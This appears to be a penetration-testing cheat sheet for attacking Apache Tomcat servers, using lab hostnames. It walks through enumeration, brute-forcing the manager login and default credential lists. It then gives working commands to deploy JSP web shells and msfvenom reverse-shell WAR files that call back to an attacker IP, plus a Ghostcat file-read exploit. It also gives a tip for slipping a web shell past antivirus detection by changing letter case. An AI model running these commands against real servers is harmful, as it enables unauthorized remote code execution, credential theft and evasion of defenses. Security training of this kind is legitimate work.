# Tomcat

[Apache Tomcat](https://tomcat.apache.org) is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts.

Tomcat is often less apt to be exposed to the internet (though). We see it from time to time on external pentests and can make for an excellent foothold into the internal network. It is far more common to see Tomcat (and multiple instances, for that matter) during internal pentests.
## Discovery & Enumeration
### Discovery/Footprinting
```sh
# Tomcat servers can be identified by the Server header in the HTTP response.
# If the server is operating behind a reverse proxy, requesting an invalid page /invalid should reveal the server and version.
/invalid
# Another method of detecting a Tomcat server and version is through the `/docs` page.
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

# General folder structure of a Tomcat installation
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost

# conf folder -> stores various configuration files used by Tomcat
# tomcat-users.xml file -> stores user credentials and their assigned roles
# webapps folder -> default webroot of Tomcat and hosts all the applications.

# Each folder inside `webapps` is expected to have the following structure.
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class
```
The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the `WEB-INF/classes` folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The `lib` folder stores the libraries needed by that particular application. The `jsp` folder stores [Jakarta Server Pages (JSP)](https://en.wikipedia.org/wiki/Jakarta_Server_Pages), formerly known as `JavaServer Pages`, which can be compared to PHP files on an Apache server.

Here’s an example web.xml file.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>
```
The `web.xml` configuration above defines a new servlet named `AdminServlet` that is mapped to the class `com.inlanefreight.api.AdminServlet`. Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:

- `classes/com/inlanefreight/api/AdminServlet.class`

Next, a new servlet mapping is created to map requests to `/admin` with `AdminServlet`. This configuration will send any request received for `/admin` to the `AdminServlet.class` class for processing. The `web.xml` descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.

The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.
```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>	
```
### Enumeration
```sh
# Unless there is a vuln, we will look for /manager and /host-manager pages
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
# Then try weaks creds such as
tomcat:tomcat
admin:admin
...
# If we log in, we can upload a WAR file containing JSP webshell
https://en.wikipedia.org/wiki/WAR_(file_format)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web
```
## Attacking
### Tomcat Manager
If we can access the `/manager` or `/host-manager` endpoints, we can likely achieve remote code execution on the Tomcat server.
#### Login Brute Force
```sh
https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/
# Set some options
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
# We check to make sure everything is set up correctly by `show options` and run
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options 
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
...
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

# If Metasploit or another tool is failing -> use Burp or ZAP for troubleshooting
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080
PROXIES => HTTP:127.0.0.1:8080
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
# A quick check on Burp -> value in the `Authorization` header for one request shows that the scanner is running correctly, base64 encoding the credentials

# Alternative Python script
https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
```
#### WAR File Upload
Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.

```sh
# Log in > use JSP web shell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp

# Browse > select .war file > Deploy
# This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table.
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
# To clean > Undeploy

# msfvenom to generate WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

# Metasploit
multi/http/tomcat_mgr_upload 

# JSP web shell very lightweight (under 1kb) and excellent to minimize footprint and evade detections
# Utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface.
https://github.com/SecurityRiskAdvisors/cmd.jsp
# A simple change such as changing:
FileOutputStream(f);stream.write(m);o="Uploaded:
# to:
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
# results in 0/58 security vendors flagging the cmd.jsp file as malicious at the time of writing.
```
### CVE-2020-1938 (Ghostcat)
```sh
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938
# unauthenticated LFI in a semi-recent discovery named. All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable.
# This vuln was caused by a misconfiguration in the AJP protocol used by Tomcat. Check if AJP is running on port 8009:
nmap -sV -p 8009,8080 app-dev.inlanefreight.local

# PoC (exploit can only read files inside web apps folders so no files like /etc/passwd)
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
# In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file.
```


## Default credentials


```sh
# The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). 

# But this path is protected by basic HTTP auth, the most common credentials are:
admin:admin
admin:tomcat
admin:<NOTHING>
admin:s3cr3t
admin:s3cret
tomcat:s3cr3t
tomcat:tomcat
tomcat:<NOTHING>
tomcat:s3cret
```


## Credential files

```
/etc/tomcat7/tomcat-users.xml
/var/lib/tomcat7/conf/tomcat-users.xml

C:\Program Files\Apache Software Foundation\Tomcat 9.0\conf
C:\Program Files (x86)\Apache Software Foundation\Tomcat 8.0\bin
```

## Exploits

[42953](https://www.exploit-db.com/exploits/42953)

## WAR upload

???+ tip 
    In case our Tomcat user only has the manager-script role, and not the usual manager-gui role, we can use only use the tomcat /manager/text/… scripting api.


```bash
# First, we’ll need a reverse shell inside of a WAR file. Msfvenom will get the job done
msfvenom -p java/shell_reverse_tcp lhost=x.x.x.x lport=xxxx -f war -o pwn.war

# Upload the WAR file:
curl -v -u 'tomcat:$pass' --upload-file pwn.war 'http://x.x.x.x:8080/manager/text/deploy?path=/foo&update=true'

# Finally, go to http://$IP:8080/foo to trigger the reverse shell.
```


## JSP webshell

```bash
curl -u admin:admin -v -X PUT --data @cmd.jsp $PATH

# Upload a .jsp webshell then visit $PATH/cmd.jsp?cmd=whoami
```

## Windows (host-manager variant)

[https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/)
